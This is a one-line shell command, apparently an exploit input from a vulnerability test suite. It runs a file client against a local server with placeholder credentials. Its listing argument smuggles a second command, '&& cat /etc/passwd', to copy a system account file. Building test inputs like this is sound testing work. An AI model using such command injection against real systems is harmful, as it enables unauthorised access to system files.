java -cp "bin:*" stonesoup.FileClient -a 127.0.0.1 -p 8021 -u johndoe -k johndoepassword -l "-la && cat /etc/passwd > data.txt" -s | tr -d "\015"

